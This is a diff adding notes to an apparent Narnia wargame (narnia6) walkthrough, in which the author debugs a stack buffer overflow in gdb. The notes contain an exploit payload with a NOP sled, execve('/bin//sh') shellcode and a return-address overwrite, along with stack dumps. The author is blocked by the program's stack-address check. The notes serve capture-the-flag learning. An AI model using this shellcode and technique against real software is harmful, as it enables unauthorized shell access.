@@ -93,3 +93,84 @@ Corresponds to this:
  80486ae:	8b 44 24 28          	mov    0x28(%esp),%eax
  80486b2:	ff d0                	call   *%eax
 
+=============== Road block ===========================
+My plan is to make the buffer bigger and pop the shellcode in there... but, as with anything else, there are issues.
+Notably that if statement that makes the program exit with -1 when we throw the return address starting with ff, see below:
+
+(gdb) run B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+Breakpoint 1, 0x08048558 in get_sp ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048697 in main ()
+(gdb) x/100x $esp
+0xffffd600:	0xffffd618	0xffffd81c	0x00000021	0x08048712
+0xffffd610:	0x00000003	0xffffd6d4	0x41414141	0x41414141
+0xffffd620:	0x41414141	0x41414141	0xffffd63c	0x90909090
+0xffffd630:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd640:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd650:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd660:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd670:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd680:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd690:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd6d0:	0x90909090	0x90909090	0x31909090	0x2f6850c0
+0xffffd6e0:	0x6868732f	0x6e69622f	0x5350e389	0xc289e189
+0xffffd6f0:	0x80cd0bb0	0xffffd900	0xffffd958	0xffffd965
+0xffffd700:	0xffffde86	0xffffde91	0xffffde9c	0xffffdefa
+0xffffd710:	0xffffdf11	0xffffdf20	0xffffdf32	0xffffdf43
+0xffffd720:	0xffffdf4c	0xffffdf5f	0xffffdf67	0xffffdf77
+0xffffd730:	0xffffdfa6	0xffffdfc6	0x00000000	0x00000020
+0xffffd740:	0xf7fdbbe0	0x00000021	0xf7fdb000	0x00000010
+0xffffd750:	0x178bfbff	0x00000006	0x00001000	0x00000011
+0xffffd760:	0x00000064	0x00000003	0x08048034	0x00000004
+0xffffd770:	0x00000020	0x00000005	0x00000008	0x00000007
+0xffffd780:	0xf7fdc000	0x00000008	0x00000000	0x00000009
+(gdb) si
+0x08048699 in main ()
+(gdb) si
+0x0804869b in main ()
+(gdb) si
+0x080486a2 in main ()
+(gdb) 
+0x08048410 in exit@plt ()
+(gdb) 
+0x08048416 in exit@plt ()
+(gdb) 
+0x0804841b in exit@plt ()
+(gdb) 
+0x080483c0 in ?? ()
+(gdb) 
+0x080483c6 in ?? ()
+
+
+As we can see the execution flow above is different from what we see below with BBBB as the value passed to eip:
+
+
+(gdb) run B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"') 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+Breakpoint 1, 0x08048558 in get_sp ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048697 in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x080486b2 in main ()
+(gdb) c  
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Now I have to figure out how to trick the get_sp() function into letting me through.
